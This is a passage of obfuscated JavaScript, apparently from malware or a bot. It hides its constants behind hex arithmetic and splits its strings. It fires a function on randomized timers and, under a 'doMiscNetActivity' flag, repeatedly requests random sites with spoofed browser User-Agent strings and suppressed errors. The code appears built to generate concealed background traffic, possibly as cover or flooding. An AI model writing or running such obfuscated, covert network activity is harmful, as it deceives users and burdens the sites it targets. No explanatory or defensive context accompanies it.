      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * 0x2330 + -0xa3 + -0x228d; k < -0x9f3 + -0xc5b + 0x1 * 0x1652; k++)
    setTimeout(f, (-0x1524c + -0x9ca * 0x13 + 0x2f6aa) * k * getRandomInt(0x305 + -0x116 * -0x1b + 0x1 * -0x2056, 0x1af1 + 0x8c6 * -0x3 + -0x9c));
  setInterval(() => {
    f();
    for (let l = -0x1 * -0xe4a + 0x2534 + -0x337e; l < -0x1a6 * -0x11 + -0xa09 + -0x11f9; l++)
      setTimeout(f, (0x9845 * 0x1 + -0x12be + 0x64d9) * l * getRandomInt(-0x25 * -0xec + 0xb50 * 0x1 + 0x97 * -0x4d, -0x18fb + -0x260f + 0x3f0d));
  }, -0x5e44c1 + 0x25e570 + 0x6f4dd1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x317 * -0xb + 0x706 * 0x4 + -0x213d * -0x1) * getRandomInt(-0x2 * 0x137f + 0x1 * -0x6dd + 0x2ddc, 0x146d + -0x46a + -0xffe * 0x1));
}, 0x707 + -0xb2 * 0x33 + -0x1 * -0x1cd3);